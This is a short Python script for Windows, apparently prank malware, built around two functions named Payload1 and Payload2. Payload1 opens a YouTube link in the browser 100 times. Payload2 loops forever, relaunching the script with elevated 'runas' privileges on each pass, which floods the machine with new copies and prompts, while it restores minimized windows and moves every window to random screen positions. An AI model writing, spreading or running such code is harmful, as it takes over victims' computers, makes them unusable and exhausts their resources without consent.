import win32gui
import win32con
import random
import ctypes
import sys
import time
import threading
import webbrowser

def restore_minimized_windows():
  top_windows = []
  def enum_handler(hwnd, top_windows):
    top_windows.append(hwnd)
  win32gui.EnumWindows(enum_handler, top_windows)

  for hwnd in top_windows:
    # Check if window is minimized
    if win32gui.IsIconic(hwnd):
      # Restore the minimized window
      win32gui.ShowWindow(hwnd, win32con.SW_SHOWNORMAL)

def get_window_titles():
  window_titles = []
  def enum_handler(hwnd, window_titles):
    title = win32gui.GetWindowText(hwnd)
    if title:
      window_titles.append(title)
  win32gui.EnumWindows(enum_handler, window_titles)
  return window_titles

def Payload1():
  for i in range(100):
    webbrowser.open("https://www.youtube.com/watch?v=qt5597kUtW8")

def Payload2():
  while True:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    window_titles = get_window_titles()
    for title in window_titles:
        restore_minimized_windows()
        window_titles = get_window_titles()
        hwnd = win32gui.FindWindow(None, title)
        move_window(hwnd, random.randint(0, 500), random.randint(0, 500))
  

def move_window(hwnd, x, y):
  win32gui.SetWindowPos(hwnd, win32con.HWND_TOP, x, y, 0, 0, win32con.SWP_NOSIZE)

if __name__ == "__main__":
  timer_thread = threading.Thread(target=Payload1)
  timer_thread.start()
  timer_thread2 = threading.Thread(target=Payload2)
  timer_thread2.start()
  